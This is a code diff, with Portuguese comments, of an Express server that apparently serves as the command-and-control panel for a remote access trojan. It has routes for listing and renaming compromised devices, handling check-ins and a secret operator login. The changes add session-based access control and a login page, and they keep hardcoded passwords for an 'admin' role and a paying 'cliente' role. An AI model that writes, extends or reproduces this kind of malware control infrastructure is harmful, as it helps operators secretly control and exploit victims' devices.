@@ -7,6 +7,13 @@ const app = express();
 const PORT = process.env.PORT || 10000;
 const C2_PASSWORD = process.env.C2_PASSWORD || 'akarui869';
 let currentC2Password = C2_PASSWORD;
+// COLE AQUI (Antes de qualquer app.get ou app.post)
+const checkAuth = (req, res, next) => {
+    if (!req.session.role) {
+        return res.redirect('/login');
+    }
+    next();
+};
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
@@ -175,28 +182,24 @@ function serveLoginPage(req, res, errorMsg = '') {
 
 // LOGIN HANDLER
 app.post('/acesso_secreto_rats_99', (req, res) => {
-    const { username, password } = req.body;
+    const { password } = req.body;
 
     if (password === 'akarui869') {
-        // Acesso Administrativo Total
         req.session.role = 'admin';
-        req.session.username = 'Administrador';
-        console.log("Login realizado: ADMIN");
         return res.redirect('/c2');
     } 
     
     if (password === '124578@') {
-        // Acesso Restrito de Cliente
         req.session.role = 'cliente';
-        req.session.username = 'Cliente';
-        console.log("Login realizado: CLIENTE");
         return res.redirect('/c2');
     }
 
-    // Senha errada
-    return res.status(401).send('Senha incorreta!');
+    res.status(401).send('Senha incorreta!');
 });
-
+// COLE AQUI (Junto com as outras rotas)
+app.get('/login', (req, res) => {
+    res.send(` ... código do HTML da telinha ... `);
+});
 
 app.get('/api/devices', (req, res) => {
     if (!req.session.role) {
@@ -449,9 +452,9 @@ app.post('/api/rename-device', (req, res) => {
 });
 
 // Route Handler for Render C2 Dashboard Navigation
-app.get(['/c2-dashboard', '/c2-home', '/render-c2'], (req, res) => {
-    return res.redirect('/');
-});
+   app.get(['/c2-dashboard', '/c2-home', '/render-c2'], (req, res) => {
+       return res.redirect('/');
+   });
 
 // GET / serves Operator Dashboard HTML or handles GET check-ins
 app.get('/', (req, res) => {
